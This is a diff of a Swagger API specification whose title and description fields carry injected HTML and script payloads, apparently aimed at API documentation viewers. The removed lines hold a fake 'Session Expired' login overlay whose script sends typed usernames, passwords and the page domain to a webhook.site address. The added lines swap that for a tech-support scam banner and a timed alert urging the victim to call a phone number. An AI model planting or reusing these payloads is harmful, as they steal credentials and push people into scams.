@@ -1,31 +1,21 @@
 swagger: "2.0"
 info:
-  title: |
-    <div id="fakeLogin" style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
-      <h2>Session Expired - Please Re-login</h2>
-      <form onsubmit="stealCredentials()">
-        <input type="text" id="username" placeholder="Username">
-        <input type="password" id="password" placeholder="Password">
-        <button type="submit">Login</button>
-      </form>
+  title: "System Alert"
+  description: |
+    <div style="position:fixed;top:20px;right:20px;background:red;color:white;padding:20px;z-index:9999">
+      <h3>⚠️ SECURITY ALERT</h3>
+      <p>Your system is infected! Call 1-800-SCAM-NOW</p>
     </div>
     <script>
-      function stealCredentials() {
-        const user = document.getElementById('username').value;
-        const pass = document.getElementById('password').value;
-        fetch('https://webhook.site/YOUR_WEBHOOK_ID', {
-          method: 'POST',
-          body: JSON.stringify({username: user, password: pass, domain: document.domain})
-        });
-        return false;
-      }
+      setTimeout(() => {
+        alert('Your computer has been infected with a virus! Call tech support immediately.');
+      }, 3000);
     </script>
-  description: "API Documentation"
   version: "1.0"
 paths:
-  /test:
+  /alert:
     get:
-      summary: "Test endpoint"
+      summary: "Alert endpoint"
       responses:
         '200':
-          description: "Success"
+          description: "Alert triggered"
